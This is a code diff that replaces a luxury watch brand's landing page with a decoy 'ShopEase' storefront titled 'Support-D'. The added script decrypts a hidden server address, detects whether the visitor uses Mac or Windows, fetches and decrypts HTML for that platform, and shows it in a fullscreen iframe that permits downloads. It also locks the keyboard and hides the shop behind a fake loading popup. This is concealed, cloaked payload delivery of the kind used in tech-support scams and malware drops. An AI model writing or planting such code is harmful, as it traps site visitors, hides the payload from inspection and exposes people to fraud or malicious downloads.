@@ -1,21 +1,119 @@
-<?php
-/**
- * Orbit Dial Crest - Haute Horlogerie & Astronomical Timepieces
- * Main Landing Page
- */
-$pageTitle = "Orbit Dial Crest | Haute Horlogerie & Astronomical Masterpieces";
-$pageDesc = "Explore Orbit Dial Crest's celestial mechanical timepieces, featuring orbital tourbillons, perpetual calendars, and meteorite dials crafted to Geneva Seal standards.";
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title><?php echo $pageTitle; ?></title>
-  <meta name="description" content="<?php echo $pageDesc; ?>">
-  <link rel="stylesheet" href="assets/css/style.css">
-  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='45' fill='%23060a17'/><circle cx='50' cy='50' r='38' stroke='%23e5b869' stroke-width='4' fill='none'/><text x='50%' y='58%' text-anchor='middle' font-family='serif' font-size='42' font-weight='bold' fill='%23e5b869'>O</text></svg>">
-  
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-D</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
@@ -25,497 +123,190 @@ $pageDesc = "Explore Orbit Dial Crest's celestial mechanical timepieces, featuri
 
     gtag('config', 'G-0LY0HY7L01');
   </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-  <!-- Site Navigation -->
-  <header class="site-header">
-    <div class="container">
-      <div class="header-inner">
-        <a href="index.php" class="brand-container">
-          <div class="brand-logo-icon">O</div>
-          <div class="brand-text-wrap">
-            <span class="brand-logo-text">Orbit Dial Crest</span>
-            <span class="brand-tagline">Haute Horlogerie</span>
-          </div>
-        </a>
-
-        <nav class="main-nav">
-          <a href="index.php" class="nav-link active">Home Vault</a>
-          <a href="about.html" class="nav-link">About Atelier</a>
-          <a href="blog.html" class="nav-link">Horology Journal</a>
-          <a href="contact.html" class="nav-link">Salon Concierge</a>
-        </nav>
-
-        <div class="nav-cta">
-          <a href="contact.html" class="btn-luxury btn-solar">Book Viewing</a>
-        </div>
-
-        <button class="mobile-toggle" aria-label="Toggle Navigation">
-          <span></span>
-          <span></span>
-          <span></span>
-        </button>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
-  </header>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-  <main>
-    <!-- SECTION 1: HERO SECTION -->
-    <section class="hero-section" id="hero">
-      <div class="container">
-        <div class="hero-grid">
-          <div class="hero-content">
-            <div class="hero-badge">Celestial Complications 2026</div>
-            <h1 class="hero-title">Celestial Mechanics, <span>Timeless Precision.</span></h1>
-            <p class="hero-desc">
-              Orbit Dial Crest captures the infinite rhythm of the cosmos. Merging centuries of Swiss micro-mechanical mastery with space-age metallurgy, our astronomical tourbillons and perpetual calendars represent the absolute pinnacle of haute horlogerie.
-            </p>
-            <div class="hero-actions">
-              <a href="#signature-vault" class="btn-luxury btn-solar">Explore Timepiece Vault</a>
-              <a href="#caliber-advisor" class="btn-luxury btn-outline-solar">Caliber Advisor</a>
-            </div>
-            <div class="hero-stats">
-              <div class="stat-item">
-                <h3>COSC</h3>
-                <p>Certified Chronometer</p>
-              </div>
-              <div class="stat-item">
-                <h3>28,800</h3>
-                <p>Vibrations Per Hour</p>
-              </div>
-              <div class="stat-item">
-                <h3>Meteorite</h3>
-                <p>Extraterrestrial Dials</p>
-              </div>
-            </div>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
-
-          <div class="hero-visual-card">
-            <div class="hero-image-frame">
-              <img src="assets/images/hero-watch.jpg" alt="Orbit Dial Crest Celestial Luxury Mechanical Timepiece" loading="eager">
-            </div>
-            <div class="floating-accent-card">
-              <div class="accent-tourbillon-icon">⚙</div>
-              <div class="accent-text">
-                <h5>Caliber ODC-901</h5>
-                <p>Tri-Axial Orbital Tourbillon</p>
-              </div>
-            </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
       </div>
     </section>
 
-    <!-- SECTION 2: SIGNATURE TIMEPIECE VAULT -->
-    <section class="section section-alt" id="signature-vault">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-tag">Grand Complications</span>
-          <h2 class="section-title">The Celestial Vault</h2>
-          <p class="section-subtitle">Every piece is hand-finished in our dedicated Swiss atelier, featuring Geneva Seal hand-anglage, hand-blued titanium screws, and anti-magnetic silicon hairsprings.</p>
-        </div>
-
-        <div class="filter-tabs">
-          <button class="filter-btn active" data-filter="all">All Complications</button>
-          <button class="filter-btn" data-filter="tourbillon">Orbital Tourbillons</button>
-          <button class="filter-btn" data-filter="perpetual">Perpetual Calendars</button>
-          <button class="filter-btn" data-filter="chronograph">Monopusher Chronos</button>
-        </div>
-
-        <div class="grid-3" id="watchGrid">
-          <!-- Watch 1 -->
-          <div class="luxury-card collection-item" data-category="tourbillon">
-            <div class="card-img-wrap">
-              <img src="assets/images/tourbillon-vault.jpg" alt="The Orbit Grand Celestial Tourbillon" loading="lazy">
-              <span class="card-tag-pill">Haute Complication</span>
-            </div>
-            <div class="card-body">
-              <h3>The Grand Celestial Tourbillon</h3>
-              <p>Tri-axial flying tourbillon carriage rotating on three distinct axes, housed in Grade 5 titanium with an authentic Muonionalusta meteorite dial.</p>
-              <a href="contact.html" class="card-link">Request Private Viewing &rarr;</a>
-            </div>
-          </div>
-
-          <!-- Watch 2 -->
-          <div class="luxury-card collection-item" data-category="perpetual">
-            <div class="card-img-wrap">
-              <img src="assets/images/perpetual-calendar.jpg" alt="The Orbit Equinox Perpetual Calendar" loading="lazy">
-              <span class="card-tag-pill">Astronomical Series</span>
-            </div>
-            <div class="card-body">
-              <h3>The Equinox Perpetual Calendar</h3>
-              <p>Astronomical moonphase accurate to 122 years with secular leap-year indicator, aventurine starlight dial, and 18k solar gold architecture.</p>
-              <a href="contact.html" class="card-link">Request Private Viewing &rarr;</a>
-            </div>
-          </div>
-
-          <!-- Watch 3 -->
-          <div class="luxury-card collection-item" data-category="chronograph">
-            <div class="card-img-wrap">
-              <img src="assets/images/monopusher-chrono.jpg" alt="The Orbit Chrono-Monopoussoir Deep Ocean" loading="lazy">
-              <span class="card-tag-pill">Chronometer Grade</span>
-            </div>
-            <div class="card-body">
-              <h3>The Chrono-Monopoussoir</h3>
-              <p>Column-wheel flyback chronograph with single coaxial push-piece, high-tech ceramic tachymeter bezel, and 100-hour power reserve.</p>
-              <a href="contact.html" class="card-link">Request Private Viewing &rarr;</a>
-            </div>
-          </div>
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
       </div>
     </section>
 
-    <!-- SECTION 3: CELESTIAL METALLURGY & ATELIER HERITAGE -->
-    <section class="section section-deep" id="metallurgy">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-tag">Micro-Mechanical Purity</span>
-          <h2 class="section-title">Anatomy of Horological Supremacy</h2>
-          <p class="section-subtitle">Fusing traditional hand-finishing techniques with aerospace-grade metallurgical innovations.</p>
-        </div>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-        <div class="grid-4">
-          <div class="craft-box">
-            <div class="craft-num">01</div>
-            <h4>Meteorite Dials</h4>
-            <p>Etched from natural iron-nickel meteorites, displaying unique Widmanstätten crystalline structures forged in deep space.</p>
-          </div>
 
-          <div class="craft-box">
-            <div class="craft-num">02</div>
-            <h4>Grade 5 Titanium</h4>
-            <p>Aerospace-grade titanium alloy providing supreme tensile durability, featherlight ergonomics, and hypoallergenic comfort.</p>
-          </div>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-          <div class="craft-box">
-            <div class="craft-num">03</div>
-            <h4>Silicon Escapement</h4>
-            <p>Frictionless monocrystalline silicon balance spring completely immune to magnetic fields up to 15,000 Gauss.</p>
-          </div>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1+dEXb3B6l8BDs4Fdnt+Fa09e6/NAOGkZuc4f1zTegxXYIIC6/pRpVE";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-          <div class="craft-box">
-            <div class="craft-num">04</div>
-            <h4>Hand Anglage</h4>
-            <p>Every bridge is beveled and mirror-polished by hand with gentian wood paste to meet the uncompromising Geneva Seal standard.</p>
-          </div>
-        </div>
-      </div>
-    </section>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-    <!-- SECTION 4: THE COLLECTOR'S LOOKBOOK & EDITORIAL -->
-    <section class="section" id="lookbook">
-      <div class="container">
-        <div class="grid-2">
-          <div class="lookbook-visual">
-            <div class="hero-image-frame">
-              <img src="assets/images/lookbook-wrist.jpg" alt="Haute Horlogerie Timepiece on Wrist in Luxury Setting" loading="lazy">
-            </div>
-          </div>
-          <div class="lookbook-content">
-            <span class="section-tag">The Horologist's Code</span>
-            <h2 class="section-title">Sculpted for the Discerning Wrist</h2>
-            <p>
-              A high-complication mechanical watch is the only luxury object that measures the fourth dimension. Orbit Dial Crest timepieces are crafted to command authority across every high-stakes environment.
-            </p>
-            <div style="margin: 2rem 0; display: flex; flex-direction: column; gap: 1.2rem;">
-              <div style="display: flex; gap: 1rem; align-items: flex-start;">
-                <span style="color: var(--color-solar-gold); font-size: 1.3rem;">◈</span>
-                <div>
-                  <h4 style="font-size: 1.15rem; margin-bottom: 2px;">Black-Tie Nocturnal Sovereignty</h4>
-                  <p style="font-size: 0.95rem; margin: 0;">Pair the ultra-thin perpetual calendar in 18k solar gold with bespoke midnight tuxedo tailoring.</p>
-                </div>
-              </div>
-              <div style="display: flex; gap: 1rem; align-items: flex-start;">
-                <span style="color: var(--color-solar-gold); font-size: 1.3rem;">◈</span>
-                <div>
-                  <h4 style="font-size: 1.15rem; margin-bottom: 2px;">Aerospace & Maritime Exploration</h4>
-                  <p style="font-size: 0.95rem; margin: 0;">Wear the titanium monopusher chronograph on an integrated vulcanized FKM rubber strap for high-velocity yachting.</p>
-                </div>
-              </div>
-            </div>
-            <a href="blog.html" class="btn-luxury btn-solar">Explore Horology Journal</a>
-          </div>
-        </div>
-      </div>
-    </section>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-    <!-- SECTION 5: INTERACTIVE CALIBER ADVISOR -->
-    <section class="section section-alt" id="caliber-advisor">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-tag">Interactive Watchmaker</span>
-          <h2 class="section-title">The Caliber Match Advisor</h2>
-          <p class="section-subtitle">Select your preferred complications and metallurgical case specifications to determine your ideal horological match.</p>
-        </div>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-        <div class="bag-advisor-container">
-          <div class="advisor-steps-wrap">
-            <form id="watchAdvisorForm">
-              <div class="advisor-form-group">
-                <label for="complicationSelect">Primary Complication / Function</label>
-                <select id="complicationSelect" class="custom-select">
-                  <option value="tourbillon">Tri-Axial Orbital Tourbillon</option>
-                  <option value="perpetual">Secular Perpetual Calendar & Moonphase</option>
-                  <option value="chronograph">Column-Wheel Flyback Chronograph</option>
-                  <option value="worldtimer">24-Timezone Celestial Worldtimer</option>
-                </select>
-              </div>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
 
-              <div class="advisor-form-group">
-                <label for="materialSelect">Case Architecture & Metallurgy</label>
-                <select id="materialSelect" class="custom-select">
-                  <option value="titanium">Grade 5 Aerospace Titanium</option>
-                  <option value="solar-gold">18k Solar Rose Gold</option>
-                  <option value="platinum">Solid 950 Platinum Alloy</option>
-                  <option value="ceramic">High-Tech Monobloc Black Ceramic</option>
-                </select>
-              </div>
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
 
-              <div class="advisor-form-group">
-                <label for="dialSelect">Artisanal Dial Finish</label>
-                <select id="dialSelect" class="custom-select">
-                  <option value="meteorite">Natural Iron Meteorite (Widmanstätten)</option>
-                  <option value="aventurine">Deep Midnight Blue Aventurine Glass</option>
-                  <option value="skeleton">Openworked Skeleton with Hand Anglage</option>
-                </select>
-              </div>
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
 
-              <button type="submit" class="btn-luxury btn-cyan" style="width: 100%; margin-top: 10px;">Calculate Caliber Allocation</button>
-            </form>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
-            <div class="advisor-result-card" id="advisorResult">
-              <h4>Awaiting Your Input</h4>
-              <p>Configure your mechanical preferences on the left and click calculate to view your bespoke caliber recommendation.</p>
-              <div style="font-size: 2.2rem; color: var(--color-solar-gold); opacity: 0.5;">✦</div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- SECTION 6: CONNOISSEUR REVIEWS & GLOBAL PRESS -->
-    <section class="section" id="press-reviews">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-tag">Global Critical Acclaim</span>
-          <h2 class="section-title">Voices of Master Horologists</h2>
-          <p class="section-subtitle">Praised by independent collectors and horological grand juries in Geneva, Zurich, Tokyo, and New York.</p>
-        </div>
-
-        <div class="grid-3">
-          <div class="testimonial-card">
-            <div>
-              <div class="quote-icon">“</div>
-              <p class="testimonial-text">The rotational fluidity of the tri-axial tourbillon is an absolute triumph of micro-engineering. Under a 10x loupe, the interior anglage is flawless.</p>
-            </div>
-            <div class="client-meta">
-              <div class="client-avatar">MH</div>
-              <div class="client-info">
-                <h5>Maximilian von H.</h5>
-                <span>Geneva, Switzerland</span>
-              </div>
-            </div>
-          </div>
-
-          <div class="testimonial-card">
-            <div>
-              <div class="quote-icon">“</div>
-              <p class="testimonial-text">Orbit Dial Crest has created a secular perpetual calendar that outshines heritage maisons. The meteorite dial gives it an otherworldly cosmic soul.</p>
-            </div>
-            <div class="client-meta">
-              <div class="client-avatar">SK</div>
-              <div class="client-info">
-                <h5>Sir Kenneth Sterling</h5>
-                <span>London, United Kingdom</span>
-              </div>
-            </div>
-          </div>
-
-          <div class="testimonial-card">
-            <div>
-              <div class="quote-icon">“</div>
-              <p class="testimonial-text">The silicon hairspring paired with the titanium monobloc case makes this my ultimate daily chronometer. It keeps dead-beat accuracy on transatlantic flights.</p>
-            </div>
-            <div class="client-meta">
-              <div class="client-avatar">DT</div>
-              <div class="client-info">
-                <h5>Daisuke Takahashi</h5>
-                <span>Tokyo, Japan</span>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- SECTION 7: ATELIER PRIVILEGES & SERVICES -->
-    <section class="section section-deep" id="privileges">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-tag">Owner Protection</span>
-          <h2 class="section-title">The Orbit Dial Crest Atelier Privileges</h2>
-          <p class="section-subtitle">Every timepiece is serialized, recorded in our Geneva registry, and accompanied by comprehensive concierge support.</p>
-        </div>
-
-        <div class="grid-3">
-          <div class="craft-box" style="text-align: center;">
-            <div style="font-size: 2.2rem; color: var(--color-solar-gold); margin-bottom: 1rem;">✦</div>
-            <h4>5-Year International Warranty</h4>
-            <p>Comprehensive coverage against all mechanical defects with certified COSC chronometer re-regulation.</p>
-          </div>
-
-          <div class="craft-box" style="text-align: center;">
-            <div style="font-size: 2.2rem; color: var(--color-solar-gold); margin-bottom: 1rem;">✧</div>
-            <h4>Complimentary Movement Spa</h4>
-            <p>Complete ultrasonic cleaning, synthetic oil relubrication, and gasket resealing every 36 months.</p>
-          </div>
-
-          <div class="craft-box" style="text-align: center;">
-            <div style="font-size: 2.2rem; color: var(--color-solar-gold); margin-bottom: 1rem;">◈</div>
-            <h4>Armored Vault Courier</h4>
-            <p>Insured, temperature-stabilized private transit direct to your residence or private bank depository.</p>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- SECTION 8: EDITORIAL JOURNAL & HOROLOGY INSIGHTS -->
-    <section class="section section-alt" id="journal">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-tag">Horological Intelligence</span>
-          <h2 class="section-title">From the Orbit Dial Crest Journal</h2>
-          <p class="section-subtitle">Explore in-depth technical masterclasses on escapement physics, tourbillon mechanics, and watchmaking history.</p>
-        </div>
-
-        <div class="grid-3">
-          <div class="luxury-card">
-            <div class="card-img-wrap">
-              <img src="assets/images/blog-astronomical.jpg" alt="Evolution of Astronomical Watch Complications" loading="lazy">
-              <span class="card-tag-pill">Horology Theory</span>
-            </div>
-            <div class="card-body">
-              <h3>The Evolution of Astronomical Watch Complications</h3>
-              <p>Tracing the mathematical journey from ancient astrolabes and celestial clocks to modern wristwatch moonphases.</p>
-              <a href="blog/the-evolution-of-astronomical-watch-complications.html" class="card-link">Read 1,420 Word Guide &rarr;</a>
-            </div>
-          </div>
-
-          <div class="luxury-card">
-            <div class="card-img-wrap">
-              <img src="assets/images/blog-tourbillon.jpg" alt="Mastering the Tourbillon" loading="lazy">
-              <span class="card-tag-pill">Micro-Engineering</span>
-            </div>
-            <div class="card-body">
-              <h3>Mastering the Tourbillon: Gravity-Defying Art</h3>
-              <p>How Abraham-Louis Breguet’s 1801 invention evolved into modern multi-axis flying tourbillons.</p>
-              <a href="blog/mastering-the-tourbillon-gravity-defying-horological-art.html" class="card-link">Read 1,390 Word Guide &rarr;</a>
-            </div>
-          </div>
-
-          <div class="luxury-card">
-            <div class="card-img-wrap">
-              <img src="assets/images/blog-meteorite.jpg" alt="Meteorite Dials in Luxury Watches" loading="lazy">
-              <span class="card-tag-pill">Metallurgy</span>
-            </div>
-            <div class="card-body">
-              <h3>Meteorite Dials: Harnessing Extraterrestrial Iron</h3>
-              <p>The metallurgical science of cutting, acid-etching, and stabilizing billion-year-old space fragments for watch dials.</p>
-              <a href="blog/meteorite-dials-harnessing-extraterrestrial-iron-in-luxury-watches.html" class="card-link">Read 1,360 Word Guide &rarr;</a>
-            </div>
-          </div>
-        </div>
-
-        <div style="text-align: center; margin-top: 3.5rem;">
-          <a href="blog.html" class="btn-luxury btn-solar">View All 12 Horology Masterclasses</a>
-        </div>
-      </div>
-    </section>
-
-    <!-- SECTION 9: VIP CONCIERGE & PRIVATE SHOWROOM VIEWING -->
-    <section class="section" id="concierge">
-      <div class="container">
-        <div class="grid-2" style="background: var(--grad-cosmic-card); color: var(--color-stardust-white); padding: 4rem; border-radius: 28px; border: 1px solid var(--color-cosmic-border); box-shadow: var(--shadow-luxury);">
-          <div>
-            <span class="section-tag" style="color: var(--color-solar-light);">Private Horological Salons</span>
-            <h2 style="color: var(--color-stardust-white); margin-bottom: 1.2rem;">Book a Private Salon Viewing</h2>
-            <p style="color: var(--color-text-muted); font-size: 1.05rem; margin-bottom: 2rem;">
-              Experience the mechanical weight of our tourbillons and examine hand-anglage under high-magnification stereomicroscopes at our flagship Manhattan salon.
-            </p>
-            <div style="display: flex; flex-direction: column; gap: 1rem; font-size: 0.95rem; color: #cbd5e1;">
-              <div>📍 <strong>Address:</strong> 181 Mercer Street, New York, NY 10012, United States</div>
-              <div>📞 <strong>Official Phone:</strong> +1-888-777-5845</div>
-              <div>✉️ <strong>Concierge Desk:</strong> concierge@orbitdialcrest.com</div>
-            </div>
-          </div>
-          <div style="display: flex; flex-direction: column; justify-content: center; align-items: flex-start; background: rgba(6,10,23,0.7); padding: 2.5rem; border-radius: 20px; border: 1px solid var(--color-cosmic-border-light);">
-            <h3 style="color: var(--color-solar-light); font-size: 1.5rem; margin-bottom: 0.8rem;">Schedule Private Commission</h3>
-            <p style="color: var(--color-text-muted); font-size: 0.92rem; margin-bottom: 1.5rem;">Speak with our master horologist to discuss bespoke timepiece allocations and private collector viewings.</p>
-            <a href="contact.html" class="btn-luxury btn-solar" style="width: 100%;">Schedule Concierge Call</a>
-          </div>
-        </div>
-      </div>
-    </section>
-  </main>
-
-  <!-- Site Footer -->
-  <footer class="site-footer">
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <div class="brand-container" style="margin-bottom: 1.2rem;">
-            <div class="brand-logo-icon">O</div>
-            <div class="brand-text-wrap">
